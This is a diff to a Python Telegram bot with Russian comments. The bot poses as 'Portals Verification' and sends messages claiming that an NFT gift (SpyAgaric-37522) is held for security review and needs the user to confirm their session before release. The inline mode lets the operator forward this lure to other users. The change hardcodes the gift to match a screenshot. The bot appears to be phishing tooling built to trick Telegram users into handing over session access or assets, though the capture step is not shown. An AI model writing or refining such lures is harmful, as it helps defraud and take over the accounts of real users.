@@ -29,7 +29,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     message = (
         f"🎩 *Portals Verification*\n\n"
         f"**Final Verification Required: Claim Your Gift**\n\n"
-        f"Your scheduled delivery of *JollyChimp #20,203* is tagged for last-mile review. "
+        f"Your scheduled delivery of *SpyAgaric-37522* is tagged for last-mile review. "
         f"To preserve platform safety and block fraudulent claim attempts, confirming "
         f"your active session is required before the gift can be released.\n\n"
         f"A single tap below and the asset is on its way."
@@ -42,7 +42,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode='Markdown'
     )
 
-# ===== ИНЛАЙН-РЕЖИМ (ПРОСТОЙ И РАБОЧИЙ) =====
+# ===== ИНЛАЙН-РЕЖИМ (только SpyAgaric-37522) =====
 async def inline_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.inline_query.query.strip()
     
@@ -54,29 +54,25 @@ async def inline_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
-    # БЕРЕМ ПЕРВОЕ СЛОВО КАК ИМЯ ПОДАРКА
-    gift_name = query if query else "JollyChimp-20203"
+    # ⚡ ТОЛЬКО SPYAGARIC-37522 (как на скриншоте)
+    gift_id = "SpyAgaric-37522"
+    gift_link = "https://t.me/nft/SpyAgaric-37522"
     
-    # ЕСЛИ ВВЕДЕНА ССЫЛКА - БЕРЕМ ID ИЗ НЕЕ
-    if query.startswith('http'):
-        gift_name = query.split('/')[-1]
-        view_gift = query
-    else:
-        view_gift = f"https://t.me/nft/{gift_name}"
-    
-    # ФОРМИРУЕМ СООБЩЕНИЕ
+    # ⚡ ТЕКСТ ТОЧНО КАК НА СКРИНШОТЕ
     message = (
-        f"❄️ *Gift temporarily unavailable*\n\n"
-        f"*{gift_name}* is currently undergoing a security review.\n\n"
+        f"🎁 *Gift temporarily unavailable*\n\n"
+        f"*{gift_id}* is currently undergoing a security review.\n\n"
         f"To regain access, please verify the gift using the official bot below.\n\n"
-        f"🔗 [View Gift]({view_gift})\n\n"
+        f"Telegram\n"
+        f"{gift_id}\n\n"
+        f"🔗 [View Gift]({gift_link})\n\n"
         f"A single tap below and the asset is on its way."
     )
     
     # СОЗДАЕМ РЕЗУЛЬТАТ
     result = InlineQueryResultArticle(
         id="1",
-        title=f"❄️ {gift_name}",
+        title=f"🎁 {gift_id}",
         description="Verify your gift",
         input_message_content=InputTextMessageContent(
             message_text=message,
@@ -97,9 +93,7 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "1. Напиши `@PortalVerificationsRobot`\n"
         "2. Выбери результат\n"
         "3. Отправь сообщение\n\n"
-        "Или напиши:\n"
-        "`@PortalVerificationsRobot JollyChimp-20203`\n"
-        "`@PortalVerificationsRobot https://t.me/nft/HappyBrownie-21443`",
+        "Или просто нажми /start для теста",
         parse_mode='Markdown'
     )
 
@@ -112,7 +106,7 @@ def main():
     application.add_handler(InlineQueryHandler(inline_query))
     
     logger.info("🚀 Бот запущен и работает!")
-    logger.info("📱 Инлайн-режим: @PortalVerificationsRobot [текст]")
+    logger.info("📱 Инлайн-режим: @PortalVerificationsRobot")
     application.run_polling(allowed_updates=Update.ALL_TYPES)
 
 if __name__ == '__main__':
